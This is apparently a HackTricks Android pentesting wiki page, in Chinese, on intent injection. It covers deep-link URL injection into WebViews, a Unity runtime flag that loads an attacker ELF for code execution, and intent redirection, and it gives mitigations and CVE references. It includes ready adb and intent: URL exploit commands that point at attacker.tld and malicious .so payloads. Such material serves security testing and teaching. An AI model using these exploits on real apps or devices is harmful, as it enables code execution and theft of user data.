# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection 滥用那些接受由攻击者控制的 Intents 或随后被转换为 Intents 的数据的组件。 在 Android 应用 pentests 中，有两种非常常见的模式：

- 将精心构造的 extras 传递给导出的 Activities/Services/BroadcastReceivers，这些 extras 随后被转发到有特权的、未导出的组件。
- 触发导出的 VIEW/BROWSABLE deep links，将攻击者控制的 URL 转发到内部 WebViews 或其他敏感汇流点。

## Deep links → WebView sink (URL 参数注入)

如果应用暴露了类似于以下的自定义 scheme deep link：
```text
myscheme://com.example.app/web?url=<attacker_url>
```
并且接收的 Activity 将 `url` 查询参数转发到 WebView 中，你可以强制该应用在其自身的 WebView 上下文中渲染任意远程内容。

PoC via adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
影响
- HTML/JS 在应用的 WebView 配置文件内执行。
- 如果 JavaScript 被启用（默认或由于检查顺序错误），你可以枚举/使用任何暴露的 `@JavascriptInterface` 对象，窃取 WebView cookies/local storage，并 pivot。

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## 检查顺序漏洞导致 JavaScript 被启用

一个常见的漏洞是在最终 URL allowlist/verification 完成之前就启用 JavaScript（或其他更宽松的 WebView 设置）。如果早期的 helpers 接受了你的 deep link 并且先配置了 WebView，那么即使后续检查有缺陷或太晚，你的最终加载也会在 JavaScript 已启用的情况下发生。

在反编译代码中要寻找的内容：
- 多个 helpers 以不同方式 parse/split/rebuild URL（归一化不一致）。
- 在最后的主机/路径 allowlist 检查之前调用 `getSettings().setJavaScriptEnabled(true)`。
- 类似的处理流水线：parse → partial validate → configure WebView → final verify → loadUrl。

缓解措施
- 只做一次 canonicalize 并严格验证；fail closed。
- 仅在所有检查通过且在加载受信任内容之前启用 JavaScript。
- 避免向不受信任的 origins 暴露 bridges。

## Unity Runtime：Intent-to-CLI extras → pre-init native library injection (RCE)

基于 Unity 的 Android 应用通常使用 `com.unity3d.player.UnityPlayerActivity`（或 `UnityPlayerGameActivity`）作为入口 Activity。Unity 的 Android 模板将名为 `unity` 的特殊 Intent extra 视为 Unity runtime 的一串命令行标志。当入口 Activity 被导出（许多模板的默认设置）时，任何本地应用——在存在 `BROWSABLE` 时有时甚至是网站——都可以提供这个 extra。

一个危险且未记录的标志会在非常早期的进程初始化期间导致本地代码执行：

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: `dlopen(<absolute-path>, RTLD_NOW)` 在初始化的非常早期被调用，在目标应用进程中加载攻击者控制的 ELF，使用该进程的 UID 和权限。

Reverse-engineering excerpt (simplified):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
为什么有效
- Intent 的 extra `unity` 会被解析为 Unity 运行时标志。
- 提供 pre-init 标志会使 Unity 指向位于允许的 linker namespace 路径内的攻击者控制的 ELF 路径（见下方约束）。

利用条件
- Unity 的入口 Activity 被导出（默认通常为 true）。
- 对于通过浏览器的一键远程利用：入口 Activity 还需声明 `android.intent.category.BROWSABLE`，以便可以通过 `intent:` URL 传递 extras。

本地利用（同一设备）
1) 将 payload ELF 放在目标应用可读的路径。最简单的方法：在你自己的攻击者应用中捆绑恶意库，并通过在攻击者的 manifest 中设置，确保它被解压到 `/data/app/.../lib/<abi>/`：
```xml
<application android:extractNativeLibs="true" ...>
```
2) 使用 `unity` extra 中的 CLI pre-init 标志启动受害者的 Unity activity。示例 ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`；你的 payload 在目标进程中运行，继承其所有应用权限（摄像头/麦克风/网络/存储 等）并访问应用内会话/数据。

Notes
- 精确的 `/data/app/...` 路径因设备/安装而异。攻击者应用可以在运行时通过 `getApplicationInfo().nativeLibraryDir` 获取其自身的本地库目录，并将其传给触发器。
- 如果文件是有效的 ELF，则不必以 `.so` 结尾 — `dlopen()` 关心的是 ELF 头，而不是扩展名。

Remote one‑click via browser (conditional)
如果 Unity 的 entry activity 使用 `BROWSABLE` 导出，网站可以通过 `intent:` URL 传递 extras：
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
然而，在现代 Android 上，dynamic linker namespaces 和 SELinux 会阻止从许多公共路径（例如 `/sdcard/Download`）加载。你会看到类似如下的错误：
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
绕过策略：针对将攻击者控制的字节缓存到其私有存储（例如 HTTP caches）的应用。因为允许的路径包括 `/data` 和应用的私有目录，将 `-xrsdk-pre-init-library` 指向应用 cache 内的绝对路径可以满足 linker constraints 并导致代码执行。 这与在其他 Android apps 中遇到的先前 cache-to-ELF RCE 模式类似。


## 其他经典 Intent injection 原语

- 使用攻击者提供的 `Intent` extras 的 startActivity/sendBroadcast，这些 extras 随后被重新解析（`Intent.parseUri(...)`）并执行。
- 导出的代理组件将 Intents 转发到未导出的敏感组件而不进行权限检查。

---

## 自动化导出组件测试 (Smali-driven ADB generation)

当导出组件期望特定的 extras 时，凭猜测 payload 结构会浪费时间并导致误报/漏报。你可以直接从 Smali 自动发现键/类型并输出可直接运行的 adb 命令。

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: 反编译并扫描 Smali 中的调用，例如 `getStringExtra("key")`、`getIntExtra("id", ...)`、`getParcelableExtra("redirect_intent")`、`getSerializableExtra(...)`、`getBooleanExtra(...)`、`getAction()`、`getData()`，以推断每个组件使用了哪些 extras 和字段。
- Output: 对于每个导出的 Activity/Service/Receiver/Provider，工具会打印简短说明以及带正确类型标志的精确 `adb shell am ...`/`cmd content ...` 命令。

安装
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
用法
```bash
python apk-components-inspector.py target.apk
```
示例输出
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras cheat sheet（类型感知标志）
- 字符串： `--es key value` | 字符串数组： `--esa key v1,v2`
- 整数： `--ei key 123` | 整数数组： `--eia key 1,2,3`
- 布尔值： `--ez key true|false`
- 长整数： `--el key 1234567890`
- 浮点数： `--ef key 1.23`
- URI（extra）： `--eu key content://...` | 数据 URI (Intent data)： `-d content://...`
- 组件 extra： `--ecn key com.pkg/.Cls`
- 空字符串 extra： `--esn key`
- 常用标志： `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Pro tips for Providers
- 使用 `adb shell cmd content query|insert|update|delete ...` 在没有 agent 的情况下访问 ContentProviders。
- 对于 SQLi 探测，在底层 provider 基于 SQLite 时，变换 `--projection` 和 `--where`（即 selection）。

Full-pipeline automation（交互式执行器）
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
帮助脚本（合并续行，仅执行以 `adb` 开头的行）:
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
在设备上运行：inspector 基于 Python，可在 Termux 或已 root 的手机上运行，只要可以使用 `apktool`/`androguard`。

---

## Intent Redirection (CWE-926) – finding and exploiting

模式
- 一个导出的入口点 (Activity/Service/Receiver) 读取传入的 Intent 并在未验证来源/数据的情况下将其转发到内部或外部，例如：
- `startActivity(getIntent())`
- `startActivity(intent)`，其中 `intent` 来自像 `redirect_intent`/`next_intent`/`pending_intent` 之类的 extra 或 `Intent.parseUri(...)`。
- 信任 `action`/`data`/`component` 字段而不进行检查；不验证调用方身份。

在 Smali/Java 中搜索什么
- 使用 `getParcelableExtra("redirect_intent")`、`getParcelable("intent")`、`getIntent().getParcelableExtra(...)` 的情况。
- 在攻击者可控的 Intents 上直接调用 `startActivity(...)`、`startService(...)`、`sendBroadcast(...)`。
- 缺少对 `getCallingPackage()`/`getCallingActivity()` 的检查或自定义权限门控。

ADB PoC templates
- 代理 Activity 将额外的 Intent 转发到特权的内部 Activity：
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- 已导出 Service 会处理 `redirect_intent` parcelable：
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Exported Receiver 在未验证的情况下转发:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
有助于 singleTask 风格行为的 Flags
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
真实案例（影响各异）:
- CVE-2024-26131 (Element Android)：导出的 flows 导致 WebView manipulation、PIN bypass、login hijack。
- CVE-2023-44121 (LG ThinQ Service)：导出的 receiver action `com.lge.lms.things.notification.ACTION` → 系统级影响。
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00)：redirection → arbitrary file access（需用户交互）。
- CVE-2022-36837 (Samsung Email < 6.1.70.20)：implicit Intents leak content。
- CVE-2021-4438 (React Native SMS User Consent)。
- CVE-2020-14116 (Xiaomi Mi Browser)。

缓解措施（开发者清单）
- 不要直接转发传入的 Intents；对允许的字段进行清理并重新构建。
- 除非必要，使用 `android:exported="false"` 限制暴露。使用权限和签名保护导出的组件。
- 验证调用方身份（`getCallingPackage()`/`getCallingActivity()`），并对应用内导航强制使用 explicit Intents。
- 在使用前验证 `action` 和 `data`（scheme/host/path）；避免在不受信任的输入上使用 `Intent.parseUri`。

---

## References

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)

{{#include ../../banners/hacktricks-training.md}}
